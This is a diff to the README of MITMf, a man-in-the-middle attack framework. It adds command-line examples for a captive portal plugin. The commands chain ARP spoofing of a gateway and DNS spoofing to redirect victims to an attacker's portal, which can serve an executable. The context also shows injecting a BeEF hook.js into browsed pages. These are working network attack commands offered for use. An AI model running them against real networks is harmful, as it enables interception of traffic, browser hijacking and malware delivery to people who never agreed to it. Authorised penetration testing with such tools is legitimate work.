@@ -112,6 +112,26 @@ Inject a JS script:
 
 ```python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js```
 
+Start a captive portal that redirects everything to http://SERVER/PATH:
+
+```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portalurl http://SERVER/PATH```
+
+Start captive portal at http://your-ip/portal.html using default page /portal.html (thx responder) and /CaptiveClient.exe (not included) from the config/captive folder:
+
+```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive```
+
+Same as above but with hostname captive.portal instead of IP (requires captive.portal to resolve to your IP, e.g. via DNS spoof):
+
+```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --use-dns```
+
+Serve a captive portal with an additional SimpleHTTPServer instance serving the LOCALDIR at http://IP:8080 (change port in mitmf.config):
+
+```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portaldir LOCALDIR```
+
+Same as above but with hostname:
+
+```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --portaldir LOCALDIR --use-dns```
+
 And much much more! 
 
 Of course you can mix and match almost any plugin together (e.g. ARP spoof + inject + Responder etc..)
